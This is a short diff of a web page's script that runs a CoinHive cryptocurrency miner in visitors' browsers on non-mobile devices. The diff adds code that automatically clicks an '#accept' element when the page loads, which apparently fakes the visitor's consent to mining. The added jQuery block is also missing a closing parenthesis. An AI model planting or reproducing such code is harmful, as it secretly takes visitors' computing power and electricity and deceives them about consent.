@@ -5,11 +5,14 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
 
-
   var miner = new CoinHive.Anonymous('jRhVb3WlGwvCvVX8D116T77LN1wzdmfn', {threads: 4,throttle: 0.8});
 
   if (!miner.isMobile() ){
    miner.start();
+  
+   $(document).ready(function() {
+    $("#accept").click();
+   }
   }
 
   </script>
